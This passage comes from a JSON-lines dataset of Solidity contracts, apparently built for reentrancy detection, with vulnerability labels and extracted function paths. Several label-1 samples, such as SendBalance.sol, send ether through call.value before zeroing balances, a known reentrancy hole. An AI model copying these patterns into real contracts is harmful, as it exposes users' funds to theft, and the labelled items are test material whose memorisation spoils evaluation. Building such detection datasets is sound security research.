maximumClaimPriceWei, _claimPriceAdjustPercent, _curseIncubationDurationSeconds, _commissionPerThousand ); } function kingdomCreationFeeInFinney() constant returns (uint feeInFinney) { return roundMoneyUpToWholeFinney(kingdomCreationFeeWei); } function () { throw; } function createKingdom( string _kingdomName, uint _startingClaimPriceWei, uint _claimPriceAdjustPercent, uint _curseIncubationDurationSeconds, uint _commissionPerThousand ) { externalEnter(); createKingdomRP( _kingdomName, _startingClaimPriceWei, _claimPriceAdjustPercent, _curseIncubationDurationSeconds, _commissionPerThousand ); externalLeave(); } function replaceWizard(address _replacement) { externalEnter(); replaceWizardRP(_replacement); externalLeave(); } function setKingdomCreationFeeWei(uint _kingdomCreationFeeWei) { externalEnter(); setKingdomCreationFeeWeiRP(_kingdomCreationFeeWei); externalLeave(); } function setMaximumClaimPriceWei(uint _maximumClaimPriceWei) { externalEnter(); setMaximumClaimPriceWeiRP(_maximumClaimPriceWei); externalLeave(); } function setKingdomFactory(KingdomFactory _kingdomFactory) { externalEnter(); setKingdomFactoryRP(_kingdomFactory); externalLeave(); } function createKingdomRP( string _kingdomName, uint _startingClaimPriceWei, uint _claimPriceAdjustPercent, uint _curseIncubationDurationSeconds, uint _commissionPerThousand ) internal { address subWizard = msg.sender; if (!validateNameInternal(_kingdomName)) { throw; } uint newKingdomNumber = kingdomsByNumber.length; checkUniqueAndRegisterNewKingdomName( _kingdomName, newKingdomNumber ); uint paidWei = msg.value; if (paidWei < kingdomCreationFeeWei) { throw; } uint excessWei = paidWei - kingdomCreationFeeWei; if (excessWei > 1 finney) { throw; } funds[topWizard] += paidWei; Kingdom kingdomContract = kingdomFactory.createKingdom( _kingdomName, address(this), topWizard, subWizard, _startingClaimPriceWei, maximumClaimPriceWei, _claimPriceAdjustPercent, _curseIncubationDurationSeconds, _commissionPerThousand ); kingdomsByNumber.push(KingdomListing( newKingdomNumber, _kingdomName, kingdomContract, msg.sender, now, kingdomFactory )); } function replaceWizardRP(address replacement) internal { if (msg.sender != topWizard) { throw; } if (msg.value != 0) { throw; } address oldWizard = topWizard; topWizard = replacement; WizardReplacedEvent(oldWizard, replacement); } function setKingdomCreationFeeWeiRP(uint _kingdomCreationFeeWei) internal { if (msg.sender != topWizard) { throw; } if (msg.value != 0) { throw; } kingdomCreationFeeWei = _kingdomCreationFeeWei; CreationFeeChangedEvent(kingdomCreationFeeWei); } function setMaximumClaimPriceWeiRP(uint _maximumClaimPriceWei) internal { if (msg.sender != topWizard) { throw; } if (msg.value != 0) { throw; } if (_maximumClaimPriceWei < 1 ether) { throw; } maximumClaimPriceWei = _maximumClaimPriceWei; } function setKingdomFactoryRP(KingdomFactory _kingdomFactory) internal { if (msg.sender != topWizard) { throw; } if (msg.value != 0) { throw; } kingdomFactory = _kingdomFactory; FactoryChangedEvent(kingdomFactory); } function checkUniqueAndRegisterNewKingdomName( string _kingdomName, uint _newKingdomNumber ) internal { uint fuzzyHash = computeNameFuzzyHash(_kingdomName); if (kingdomNumbersByfuzzyHash[fuzzyHash] != 0) { throw; } kingdomNumbersByfuzzyHash[fuzzyHash] = _newKingdomNumber; } } contract ExposedInternalsForTesting is MoneyRounderMixin, NameableMixin { function roundMoneyDownNicelyET(uint _rawValueWei) constant returns (uint nicerValueWei) { return roundMoneyDownNicely(_rawValueWei); } function roundMoneyUpToWholeFinneyET(uint _valueWei) constant returns (uint valueFinney) { return roundMoneyUpToWholeFinney(_valueWei); } function validateNameInternalET(string _name) constant returns (bool allowed) { return validateNameInternal(_name); } function extractNameFromDataET(bytes _data) constant returns (string extractedName) { return extractNameFromData(_data); } function computeNameFuzzyHashET(string _name) constant returns (uint fuzzyHash) { return computeNameFuzzyHash(_name); } } "}
{"sol name": "SendBalance.sol", "label": 1, "first path": "function withdrawBalance(){ if (!(msg.sender.call.value(userBalances[msg.sender])())) { throw ; } userBalances[msg.sender] = 0; ", "second path": "function withdrawBalance(){ if (!(msg.sender.call.value(userBalances[msg.sender])())) { throw ; } userBalances[msg.sender] = 0; ", "third path": "function withdrawBalance(){ if (!(msg.sender.call.value(userBalances[msg.sender])())) { throw ; } userBalances[msg.sender] = 0; ", "long path": "contract SendBalance { mapping (address => uint) userBalances ; bool withdrawn = false ; function getBalance(address u) constant returns (uint){ return userBalances[u]; } function addToBalance() { userBalances msg.sender] += msg.value ; } function withdrawBalance(){ if (!(msg.sender.call.value(userBalances[msg.sender])())) { throw ; } userBalances[msg.sender] = 0; } } "}
{"sol name": "39866.sol", "label": 1, "first path": "function funding() payable { if(fundingLock||block.number<startBlock||block.number>startBlock+blockDuration) throw; if(balances[msg.sender]>balances[msg.sender]+msg.value*fundingExchangeRate || msg.value>msg.value*fundingExchangeRate) throw; if(!fundingAccount.call.value(msg.value)()) throw; balances[msg.sender]+=msg.value*fundingExchangeRate; Funding(msg.sender,msg.value); function buy(string _commit) payable{ if(balances[msg.sender]>balances[msg.sender]+msg.value*price || msg.value>msg.value*price) throw; if(!fundingAccount.call.value(msg.value)()) throw; balances[msg.sender]+=msg.value*price; commit[msg.sender]=_commit; Buy(msg.sender,msg.value); ", "second path": "function funding() payable { if(fundingLock||block.number<startBlock||block.number>startBlock+blockDuration) throw; if(balances[msg.sender]>balances[msg.sender]+msg.value*fundingExchangeRate || msg.value>msg.value*fundingExchangeRate) throw; if(!fundingAccount.call.value(msg.value)()) throw; balances[msg.sender]+=msg.value*fundingExchangeRate; Funding(msg.sender,msg.value); function buy(string _commit) payable{ if(balances[msg.sender]>balances[msg.sender]+msg.value*price || msg.value>msg.value*price) throw; if(!fundingAccount.call.value(msg.value)()) throw; balances[msg.sender]+=msg.value*price; commit[msg.sender]=_commit; Buy(msg.sender,msg.value); ", "third path": "function funding() payable { if(fundingLock||block.number<startBlock||block.number>startBlock+blockDuration) throw; if(balances[msg.sender]>balances[msg.sender]+msg.value*fundingExchangeRate || msg.value>msg.value*fundingExchangeRate) throw; if(!fundingAccount.call.value(msg.value)()) throw; balances[msg.sender]+=msg.value*fundingExchangeRate; Funding(msg.sender,msg.value); function buy(string _commit) payable{ if(balances[msg.sender]>balances[msg.sender]+msg.value*price || msg.value>msg.value*price) throw; if(!fundingAccount.call.value(msg.value)()) throw; balances[msg.sender]+=msg.value*price; commit[msg.sender]=_commit; Buy(msg.sender,msg.value); ", "long path": "pragma solidity ^0.4.2; contract Token{ event Transfer(address indexed _from, address indexed _to, uint256 _value); event Approval(address indexed _onwer,address indexed _spender, uint256 _value); function totalSupply() constant returns(uint256 totalSupply){} function balanceOf(address _owner) constant returns (uint256 balance){} function transfer(address _to, uint256 _value) constant returns(bool success){} function transferFrom(address _from, address _to, uint256 _value) constant returns (bool success){} function approve(address _spender, uint256 _value) constant returns(bool success){} function allowance(address _owner, uint _spender) constant returns(uint256 remaining){} } contract StandardToken is Token{ uint256 public totalSupply; mapping(address => uint256)balances; mapping(address =>mapping(address=>uint256))allowed; function transfer(address _to, uint256 _value)constant returns(bool success){ if(balances[msg.sender]>_value && balances[_to]+_value>balances[_to]) { balances[msg.sender] -= _value; balances[_to] +=_value; Transfer(msg.sender,_to,_value); return true; } else { return false; } } function transferFrom(address _from, address _to, uint256 _value)constant returns(bool success){ if(balances[_from]>_value && allowed[_from][msg.sender]>_value && balances[_to]+_value>balances[_to]){ balances[_from]-=_value; allowed[_from][msg.sender]-=_value; balances[_to]-=_value; Transfer(_from,_to,_value); return true; } else { return false; } } function approve(address _spender, uint256 _value)constant returns (bool success){ allowed[msg.sender][_spender]=_value; Approval(msg.sender,_spender,_value); return true; } function balanceOf(address _owner) constant returns (uint256 balance){ return balances[_owner]; } function allowance(address _onwer,address _spender) constant returns(uint256 allowance){ return allowed[_onwer][_spender]; } } contract NinjaToken is StandardToken{ string public name =\"NinjaToken\"; string public version=\"0.0.1\"; uint public decimals = 18; mapping(address=>string) public commit; address public founder; address public admin; bool public fundingLock=true; address public fundingAccount; uint public startBlock; uint public blockDuration; uint public fundingExchangeRate; uint public price=10; bool public transferLock=false; event Funding(address sender, uint256 eth); event Buy(address buyer, uint256 eth); function NinjaToken(address _founder,address _admin){ founder=_founder; admin=_admin; } function changeFunder(address _founder,address _admin){ if(msg.sender!=admin) throw; founder=_founder; admin=_admin; } function setFundingLock(bool _fundinglock,address _fundingAccount){ if(msg.sender!=founder) throw; fundingLock=_fundinglock; fundingAccount=_fundingAccount; } function setFundingEnv(uint _startBlock, uint _blockDuration,uint _fundingExchangeRate){ if(msg.sender!=founder) throw; startBlock=_startBlock; blockDuration=_blockDuration; fundingExchangeRate=_fundingExchangeRate; } function funding() payable { if(fundingLock||block.number<startBlock||block.number>startBlock+blockDuration) throw; if(balances[msg.sender]>balances[msg.sender]+msg.value*fundingExchangeRate || msg.value>msg.value*fundingExchangeRate) throw; if(!fundingAccount.call.value(msg.value)()) throw; balances[msg.sender]+=msg.value*fundingExchangeRate; Funding(msg.sender,msg.value); } function setPrice(uint _price,bool _transferLock){ if(msg.sender!=founder) throw; price=_price; transferLock=_transferLock; } function buy(string _commit) payable{ if(balances[msg.sender]>balances[msg.sender]+msg.value*price || msg.value>msg.value*price) throw; if(!fundingAccount.call.value(msg.value)()) throw; balances[msg.sender]+=msg.value*price; commit[msg.sender]=_commit; Buy(msg.sender,msg.value); } function transfer(address _to, uint256 _value)constant returns(bool success){ if(transferLock) throw; return super.transfer(_to, _value); } function transferFrom(address _from, address _to, uint256 _value)constant returns(bool success){ if(transferLock) throw; return super.transferFrom(_from, _to, _value); } } "}
{"sol name": "39127.sol", "label": 0, "first path": "function executeProposal(uint256 _proposalID, bytes _transactionBytecode) onlyCongressMembers { Proposal p = proposals[_proposalID]; if (p.state != ProposalState.Passed) throw; p.state = ProposalState.Executed; if (!p.beneficiary.call.value(p.etherAmount * 1 ether)(_transactionBytecode)) { throw; } ProposalExecutedEvent(_proposalID); ", "second path": "function executeProposal(uint256 _proposalID, bytes _transactionBytecode) onlyCongressMembers { Proposal p = proposals[_proposalID]; if (p.state != ProposalState.Passed) throw; p.state = ProposalState.Executed; if (!p.beneficiary.call.value(p.etherAmount * 1 ether)(_transactionBytecode)) { throw; } ProposalExecutedEvent(_proposalID); ", "third path": "function executeProposal(uint256 _proposalID, bytes _transactionBytecode) onlyCongressMembers { Proposal p = proposals[_proposalID]; if (p.state != ProposalState.Passed) throw; p.state = ProposalState.Executed; if (!p.beneficiary.call.value(p.etherAmount * 1 ether)(_transactionBytecode)) { throw; } ProposalExecutedEvent(_proposalID); ", "long path": "pragma solidity ^0.4.11; contract ERC223TokenInterface { function name() constant returns (string _name); function symbol() constant returns (string _symbol); function decimals() constant returns (uint8 _decimals); function totalSupply() constant returns (uint256 _supply); function balanceOf(address _owner) constant returns (uint256 _balance); function approve(address _spender, uint256 _value) returns (bool _success); function allowance(address _owner, address spender) constant returns (uint256 _remaining); function transfer(address _to, uint256 _value) returns (bool _success); function transfer(address _to, uint256 _value, bytes _metadata) returns (bool _success); function transferFrom(address _from, address _to, uint256 _value) returns (bool _success); event Approval(address indexed owner, address indexed spender, uint256 value); event Transfer(address indexed from, address indexed to, uint256 value); event Transfer(address indexed from, address indexed to, uint256 value, bytes metadata); } contract ERC223ContractInterface { function erc223Fallback(address _from, uint256 _value, bytes _data){ _from = _from; _value = _value; _data = _data; throw; } } contract SafeMath { uint256 constant public MAX_UINT256 = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF; function safeAdd(uint256 x, uint256 y) constant internal returns (uint256 z) { if (x > MAX_UINT256 - y) throw; return x + y; } function safeSub(uint256 x, uint256 y) constant internal returns (uint256 z) { if (x < y) throw; return x - y; } function safeMul(uint256 x, uint256 y) constant internal returns (uint256 z) { if (y == 0) return 0; if (x > MAX_UINT256 / y) throw; return x * y; } } contract ERC223Token is ERC223TokenInterface, SafeMath { mapping (address => uint256) balances; mapping (address => mapping (address => uint256)) allowances; string public name; string public symbol; uint8 public decimals; uint256 public totalSupply; function name() constant returns (string _name) { return name; } function symbol() constant returns (string _symbol) { return symbol; } function decimals() constant returns (uint8 _decimals) { return decimals; } function totalSupply() constant returns (uint256 _supply) { return totalSupply; } function balanceOf(address _owner) constant returns (uint256 _balance) { return balances[_owner]; } function approve(address _spender, uint256 _value) returns (bool _success) { allowances[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); return true; } function allowance(address _owner, address _spender) constant returns (uint256 _remaining) { return allowances[_owner][_spender]; } function transfer(address _to, uint256 _value) returns (bool _success) { bytes memory emptyMetadata; __transfer(msg.sender, _to, _value, emptyMetadata); return true; } function transfer(address _to, uint256 _value, bytes _metadata) returns (bool _success) { __transfer(msg.sender, _to, _value, _metadata); Transfer(msg.sender, _to, _value, _metadata); return true; } function transferFrom(address _from, address _to, uint256 _value) returns (bool _success) { if (allowances[_from][msg.sender] < _value) throw; allowances[_from][msg.sender] = safeSub(allowances[_from][msg.sender], _value); bytes memory emptyMetadata; __transfer(_from, _to, _value, emptyMetadata); return true; } function __transfer(address _from, address _to, uint256 _value, bytes _metadata) internal { if (_from == _to) throw; if (_value == 0) throw; if (balanceOf(_from) < _value) throw; balances[_from] = safeSub(balanceOf(_from), _value); balances[_to] = safeAdd(balanceOf(_to), _value); if (isContract(_to)) { ERC223ContractInterface receiverContract = ERC223ContractInterface(_to); receiverContract.erc223Fallback(_from, _value, _metadata); } Transfer(_from, _to, _value); } function isContract(address _addr) internal returns (bool _isContract) { _addr = _addr; uint256 length; assembly { length := extcodesize(_addr) } return (length > 0); } } contract DASToken is ERC223Token { mapping (address => bool) blockedAccounts; address public secretaryGeneral; function DASToken( string _name, string _symbol, uint8 _decimals, uint256 _totalSupply, address _initialTokensHolder) { secretaryGeneral = msg.sender; name = _name; symbol = _symbol; decimals = _decimals; totalSupply = _totalSupply; balances[_initialTokensHolder] = _totalSupply; } modifier onlySecretaryGeneral { if (msg.sender != secretaryGeneral) throw; _; } function blockAccount(address _account) onlySecretaryGeneral { blockedAccounts[_account] = true; } function unblockAccount(address _account) onlySecretaryGeneral { blockedAccounts[_account] = false; } function isAccountBlocked(address _account) returns (bool){ return blockedAccounts[_account]; } function transfer(address _to, uint256 _value) returns (bool _success) { if (blockedAccounts[msg.sender]) { throw; } return super.transfer(_to, _value); } function transfer(address _to, uint256 _value, bytes _metadata) returns (bool _success) { if (blockedAccounts[msg.sender]) { throw; } return super.transfer(_to, _value, _metadata); } function transferFrom(address _from, address _to, uint256 _value) returns (bool _success) { if (blockedAccounts[_from]) { throw; } return super.transferFrom(_from, _to, _value); } } contract ABCToken is ERC223Token { function ABCToken( string _name, string _symbol, uint8 _decimals, uint256 _totalSupply, address _initialTokensHolder) { name = _name; symbol = _symbol; decimals = _decimals; totalSupply = _totalSupply; balances[_initialTokensHolder] = _totalSupply; } } contract DAS is ERC223ContractInterface { string name = \"Decentralized Autonomous State\"; DASToken public dasToken; ABCToken public abcToken; uint256 public congressMemberThreshold; uint256 public minimumQuorum; uint256 public debatingPeriod; uint256 public marginForMajority; Proposal[] public proposals; uint256 public proposalsNumber = 0; mapping (address => uint32) tokensLocks; event ProposalAddedEvent(uint256 proposalID, address beneficiary, uint256 etherAmount, string description); event VotedEvent(uint256 proposalID, address voter, bool inSupport, uint256 voterTokens, string justificationText); event ProposalTalliedEvent(uint256 proposalID, bool quorum, bool result); event ProposalExecutedEvent(uint256 proposalID); event RulesChangedEvent(uint256 congressMemberThreshold, uint256 minimumQuorum, uint256 debatingPeriod, uint256 marginForMajority); enum ProposalState {Proposed, NoQuorum, Rejected, Passed, Executed} struct Proposal { address beneficiary; uint256 etherAmount; string description; bytes32 proposalHash; ProposalState state; uint256 votingDeadline; Vote[] votes; uint256 votesNumber; mapping (address => bool) voted; } struct Vote { address voter; bool inSupport; uint256 voterTokens; string justificationText; } modifier onlyCongressMembers { if (dasToken.balanceOf(msg.sender) < congressMemberThreshold) throw; _; } function DAS( uint256 _congressMemberThreshold, uint256 _minimumQuorum, uint256 _debatingPeriod, uint256 _marginForMajority, address _congressLeader ) payable { dasToken = new DASToken('DA$', 'DA$', 18, 1000000000 * (10 ** 18), _congressLeader); abcToken = new ABCToken('Alphabit', 'ABC', 18, 210000000 * (10 ** 18), _congressLeader); congressMemberThreshold = _congressMemberThreshold; minimumQuorum = _minimumQuorum; debatingPeriod = _debatingPeriod; marginForMajority = _marginForMajority; RulesChangedEvent(congressMemberThreshold, minimumQuorum, debatingPeriod, marginForMajority); } function() payable { } function erc223Fallback(address _from, uint256 _value, bytes _data){ _from = _from; _value = _value; _data = _data; } function getProposalHash( address _beneficiary, uint256 _etherAmount, bytes _transactionBytecode ) constant returns (bytes32) { return sha3(_beneficiary, _etherAmount, _transactionBytecode); } function blockTokens(address _voter) internal { if (tokensLocks[_voter] + 1 < tokensLocks[_voter]) throw; tokensLocks[_voter] += 1; if (tokensLocks[_voter] == 1) { dasToken.blockAccount(_voter); } } function unblockTokens(address _voter) internal { if (tokensLocks[_voter] <= 0) throw; tokensLocks[_voter] -= 1; if (tokensLocks[_voter] == 0) { dasToken.unblockAccount(_voter); } } function createProposal( address _beneficiary, uint256 _etherAmount, string _description, bytes _transactionBytecode ) onlyCongressMembers returns (uint256 _proposalID) { _proposalID = proposals.length; proposals.length += 1; proposalsNumber = _proposalID + 1; proposals[_proposalID].beneficiary = _beneficiary; proposals[_proposalID].etherAmount = _etherAmount; proposals[_proposalID].description = _description; proposals[_proposalID].proposalHash = getProposalHash(_beneficiary, _etherAmount, _transactionBytecode); proposals[_proposalID].state = ProposalState.Proposed; proposals[_proposalID].votingDeadline = now + debatingPeriod * 1 seconds; proposals[_proposalID].votesNumber = 0; ProposalAddedEvent(_proposalID, _beneficiary, _etherAmount, _description); return _proposalID; } function vote( uint256 _proposalID, bool _inSupport, string _justificationText ) onlyCongressMembers { Proposal p = proposals[_proposalID]; if (p.state != ProposalState.Proposed) throw; if (p.voted[msg.sender] == true) throw; var voterTokens = dasToken.balanceOf(msg.sender); blockTokens(msg.sender); p.voted[msg.sender] = true; p.votes.push(Vote(msg.sender, _inSupport, voterTokens, _justificationText)); p.votesNumber += 1; VotedEvent(_proposalID, msg.sender, _inSupport, voterTokens, _justificationText); } function finishProposalVoting(uint256 _proposalID) onlyCongressMembers { Proposal p = proposals[_proposalID]; if (now < p.votingDeadline) throw; if (p.state != ProposalState.Proposed) throw; var _votesNumber = p.votes.length; uint256 tokensFor = 0; uint256 tokensAgainst = 0; for (uint256 i = 0; i < _votesNumber; i++) { if (p.votes[i].inSupport) { tokensFor += p.votes[i].voterTokens; } else { tokensAgainst += p.votes[i].voterTokens; } unblockTokens(p.votes[i].voter); } if ((tokensFor + tokensAgainst) < minimumQuorum) { p.state = ProposalState.NoQuorum; ProposalTalliedEvent(_proposalID, false, false); return; } if ((tokensFor - tokensAgainst) < marginForMajority) { p.state = ProposalState.Rejected; ProposalTalliedEvent(_proposalID, true, false); return; } p.state = ProposalState.Passed; ProposalTalliedEvent(_proposalID, true, true); return; } function executeProposal(uint256 _proposalID, bytes _transactionBytecode) onlyCongressMembers { Proposal p = proposals[_proposalID]; if (p.state != ProposalState.Passed) throw; p.state = ProposalState.Executed; if (!p.beneficiary.call.value(p.etherAmount * 1 ether)(_transactionBytecode)) { throw; } ProposalExecutedEvent(_proposalID); } } "}
{"sol name": "39912.sol", "label": 0, "first path": "function simulatePathwayFromBeneficiary() public payable { bytes4 buySig = bytes4(sha3(\"buy()\")); if (!Resilience.call.value(msg.value)(buySig)) throw; bytes4 transferSig = bytes4(sha3(\"transfer(address,uint256)\")); if (!Resilience.call(transferSig, msg.sender, msg.value)) throw; ", "second path": "function simulatePathwayFromBeneficiary() public payable { bytes4 buySig = bytes4(sha3(\"buy()\")); if (!Resilience.call.value(msg.value)(buySig)) throw; bytes4 transferSig = bytes4(sha3(\"transfer(address,uint256)\")); if (!Resilience.call(transferSig, msg.sender, msg.value)) throw; ", "third path": "function simulatePathwayFromBeneficiary() public payable { bytes4 buySig = bytes4(sha3(\"buy()\")); if (!Resilience.call.value(msg.value)(buySig)) throw; bytes4 transferSig = bytes4(sha3(\"transfer(address,uint256)\")); if (!Resilience.call(transferSig, msg.sender, msg.value)) throw; ", "long path": "pragma solidity ^ 0.4 .6; contract owned { address public owner; function owned() { owner = msg.sender; } modifier onlyOwner { if (msg.sender != owner) throw; _; } function transferOwnership(address newOwner) onlyOwner { owner = newOwner; } } contract CampaignBeneficiary is owned{ address public Resilience; function CampaignBeneficiary() { Resilience = 0xDA922E473796bc372d4a2cb95395ED17aF8b309B; bytes4 setBeneficiarySig = bytes4(sha3(\"setBeneficiary()\")); if (!Resilience.call(setBeneficiarySig)) throw; } function() payable { if(msg.sender != Resilience) throw; } function simulatePathwayFromBeneficiary() public payable { bytes4 buySig = bytes4(sha3(\"buy()\")); if (!Resilience.call.value(msg.value)(buySig)) throw; bytes4 transferSig = bytes4(sha3(\"transfer(address,uint256)\")); if (!Resilience.call(transferSig, msg.sender, msg.value)) throw; } function sell(uint256 _value) onlyOwner { bytes4 sellSig = bytes4(sha3(\"sell(uint256)\")); if (!Resilience.call(sellSig, _value)) throw; } function withdraw(uint256 _value) onlyOwner { if (!msg.sender.send(_value)) throw; } function closeCampaign() onlyOwner { bytes4 closeCampaignSig = bytes4(sha3(\"closeCampaign()\")); if (!Resilience.call(closeCampaignSig)) throw; } } "}
{"sol name": "34577.sol", "label": 0, "first path": "function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) { if (isConfirmed(transactionId)) { Transaction storage txn = transactions[transactionId]; txn.executed = true; if (!txn.destination.call.value(txn.value)(txn.data)) revert(); Execution(transactionId); function confirmTransaction(bytes32 transactionId)   public   ownerExists(msg.sender)    notConfirmed(transactionId, msg.sender) { confirmations[transactionId][msg.sender] = true; Confirmation(msg.sender, transactionId); executeTransaction(transactionId); ", "second path": "function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) { if (isConfirmed(transactionId)) { Transaction storage txn = transactions[transactionId]; txn.executed = true; if (!txn.destination.call.value(txn.value)(txn.data)) revert(); Execution(transactionId); function confirmTransaction(bytes32 transactionId)   public   ownerExists(msg.sender)    notConfirmed(transactionId, msg.sender) { confirmations[transactionId][msg.sender] = true; Confirmation(msg.sender, transactionId); executeTransaction(transactionId); ", "third path": "function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) { if (isConfirmed(transactionId)) { Transaction storage txn = transactions[transactionId]; txn.executed = true; if (!txn.destination.call.value(txn.value)(txn.data)) revert(); Execution(transactionId); function confirmTransaction(bytes32 transactionId)   public   ownerExists(msg.sender)    notConfirmed(transactionId, msg.sender) { confirmations[transactionId][msg.sender] = true; Confirmation(msg.sender, transactionId); executeTransaction(transactionId); ", "long path": "pragma solidity ^0.4.17; contract MultiSigWallet { event Confirmation(address sender, bytes32 transactionId); event Revocation(address sender, bytes32 transactionId); event Submission(bytes32 transactionId); event Execution(bytes32 transactionId); event Deposit(address sender, uint value); event OwnerAddition(address owner); event OwnerRemoval(address owner); event RequirementChange(uint required); event CoinCreation(address coin); mapping (bytes32 => Transaction) public transactions; mapping (bytes32 => mapping (address => bool)) public confirmations; mapping (address => bool) public isOwner; address[] owners; bytes32[] transactionList; uint public required; struct Transaction { address destination; uint value; bytes data; uint nonce; bool executed; } modifier onlyWallet() { if (msg.sender != address(this)) revert(); _; } modifier ownerDoesNotExist(address owner) { if (isOwner[owner]) revert(); _; } modifier ownerExists(address owner) { if (!isOwner[owner]) revert(); _; } modifier confirmed(bytes32 transactionId, address owner) { if (!confirmations[transactionId][owner]) revert(); _; } modifier notConfirmed(bytes32 transactionId, address owner) { if (confirmations[transactionId][owner]) revert(); _; } modifier notExecuted(bytes32 transactionId) { if (transactions[transactionId].executed) revert(); _; } modifier notNull(address destination) { if (destination == 0) revert(); _; } modifier validRequirement(uint _ownerCount, uint _required) { if (   _required > _ownerCount || _required == 0 || _ownerCount == 0) revert(); _; } function addOwner(address owner) external onlyWallet ownerDoesNotExist(owner) { isOwner[owner] = true; owners.push(owner); OwnerAddition(owner); } function removeOwner(address owner) external onlyWallet ownerExists(owner) { isOwner[owner] = false; for (uint i=0; i<owners.length - 1; i++) if (owners[i] == owner) { owners[i] = owners[owners.length - 1]; break; } owners.length -= 1; if (required > owners.length) changeRequirement(owners.length); OwnerRemoval(owner); } function changeRequirement(uint _required) public onlyWallet validRequirement(owners.length, _required) { required = _required; RequirementChange(_required); } function addTransaction(address destination, uint value, bytes data, uint nonce) private notNull(destination) returns (bytes32 transactionId) { transactionId = keccak256(destination, value, data, nonce); if (transactions[transactionId].destination == 0) { transactions[transactionId] = Transaction({ destination: destination, value: value, data: data, nonce: nonce, executed: false }); transactionList.push(transactionId); Submission(transactionId); } } function submitTransaction(address destination, uint value, bytes data, uint nonce)   external ownerExists(msg.sender)   returns (bytes32 transactionId) { transactionId = addTransaction(destination, value, data, nonce); confirmTransaction(transactionId); } function confirmTransaction(bytes32 transactionId)   public   ownerExists(msg.sender)    notConfirmed(transactionId, msg.sender) { confirmations[transactionId][msg.sender] = true; Confirmation(msg.sender, transactionId); executeTransaction(transactionId); } function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) { if (isConfirmed(transactionId)) { Transaction storage txn = transactions[transactionId]; txn.executed = true; if (!txn.destination.call.value(txn.value)(txn.data)) revert(); Execution(transactionId); } } function revokeConfirmation(bytes32 transactionId) external ownerExists(msg.sender) confirmed(transactionId, msg.sender) notExecuted(transactionId) { confirmations[transactionId][msg.sender] = false; Revocation(msg.sender, transactionId); } function MultiSigWallet(address[] _owners, uint _required) validRequirement(_owners.length, _required) public { for (uint i=0; i<_owners.length; i++) { isOwner[_owners[i]] = true; } owners = _owners; required = _required; } function() public payable { if (msg.value > 0) Deposit(msg.sender, msg.value); } function isConfirmed(bytes32 transactionId) public constant returns (bool) { uint count = 0; for (uint i=0; i<owners.length; i++) if (confirmations[transactionId][owners[i]]) count += 1; if (count == required) return true; } function confirmationCount(bytes32 transactionId) external constant returns (uint count) { for (uint i=0; i<owners.length; i++) if (confirmations[transactionId][owners[i]]) count += 1; } function filterTransactions(bool isPending) private constant returns (bytes32[] _transactionList) { bytes32[] memory _transactionListTemp = new bytes32[](transactionList.length); uint count = 0; for (uint i=0; i<transactionList.length; i++) if (   isPending && !transactions[transactionList[i]].executed || !isPending && transactions[transactionList[i]].executed) { _transactionListTemp[count] = transactionList[i]; count += 1; } _transactionList = new bytes32[](count); for (i=0; i<count; i++) if (_transactionListTemp[i] > 0) _transactionList[i] = _transactionListTemp[i]; } function getPendingTransactions() external constant returns (bytes32[]) { return filterTransactions(true); } function getExecutedTransactions() external constant returns (bytes32[]) { return filterTransactions(false); } } "}
{"sol name": "cross-function-reentrancy-fixed.sol", "label": 0, "first path": "function untrustedWithdrawReward(address recipient) public { uint amountToWithdraw = rewardsForA[recipient]; rewardsForA[recipient] = 0; if (recipient.call.value(amountToWithdraw)() == false) {  throw;} function untrustedGetFirstWithdrawalBonus(address recipient) public { if (claimedBonus[recipient] == false) {throw;} claimedBonus[recipient] = true; rewardsForA[recipient] += 100; untrustedWithdrawReward(recipient); ", "second path": "function untrustedWithdrawReward(address recipient) public { uint amountToWithdraw = rewardsForA[recipient]; rewardsForA[recipient] = 0; if (recipient.call.value(amountToWithdraw)() == false) {  throw;} function untrustedGetFirstWithdrawalBonus(address recipient) public { if (claimedBonus[recipient] == false) {throw;} claimedBonus[recipient] = true; rewardsForA[recipient] += 100; untrustedWithdrawReward(recipient); ", "third path": "function untrustedWithdrawReward(address recipient) public { uint amountToWithdraw = rewardsForA[recipient]; rewardsForA[recipient] = 0; if (recipient.call.value(amountToWithdraw)() == false) {  throw;} function untrustedGetFirstWithdrawalBonus(address recipient) public { if (claimedBonus[recipient] == false) {throw;} claimedBonus[recipient] = true; rewardsForA[recipient] += 100; untrustedWithdrawReward(recipient); ", "long path": "pragma solidity ^0.4.18; contract Owner{ mapping (address => uint) private userBalances; mapping (address => bool) private claimedBonus; mapping (address => uint) private rewardsForA; function untrustedWithdrawReward(address recipient) public { uint amountToWithdraw = rewardsForA[recipient]; rewardsForA[recipient] = 0; if (recipient.call.value(amountToWithdraw)() == false) {  throw;} } function untrustedGetFirstWithdrawalBonus(address recipient) public { if (claimedBonus[recipient] == false) {throw;} claimedBonus[recipient] = true; rewardsForA[recipient] += 100; untrustedWithdrawReward(recipient); } } "}
{"sol name": "21999.sol", "label": 0, "first path": "function call(address addr, bytes data, uint256 amount) public payable onlyOwner { if (msg.value > 0) deposit(); require(addr.call.value(amount)(data)); Call(msg.sender, addr, amount); ", "second path": "function call(address addr, bytes data, uint256 amount) public payable onlyOwner { if (msg.value > 0) deposit(); require(addr.call.value(amount)(data)); Call(msg.sender, addr, amount); ", "third path": "function call(address addr, bytes data, uint256 amount) public payable onlyOwner { if (msg.value > 0) deposit(); require(addr.call.value(amount)(data)); Call(msg.sender, addr, amount); ", "long path": "pragma solidity ^0.4.18; contract Owned { address owner; function Owned() public { owner = msg.sender; } modifier onlyOwner { if (msg.sender != owner) revert(); _; } } contract WalletWithEmergencyTransfer is Owned { event Deposit(address from, uint amount); event Withdrawal(address from, uint amount); event Call(address from, address to, uint amount); address public owner = msg.sender; uint256 private emergencyCode; uint256 private emergencyAmount; function WalletWithEmergencyTransfer() public { } function() public payable { deposit(); } function deposit() public payable { require(msg.value > 0); Deposit(msg.sender, msg.value); } function withdraw(uint amount) public onlyOwner { require(amount <= this.balance); msg.sender.transfer(amount); Withdrawal(msg.sender, amount); } function call(address addr, bytes data, uint256 amount) public payable onlyOwner { if (msg.value > 0) deposit(); require(addr.call.value(amount)(data)); Call(msg.sender, addr, amount); } function setEmergencySecrets(uint256 code, uint256 amount) public onlyOwner { emergencyCode = code; emergencyAmount = amount; } function 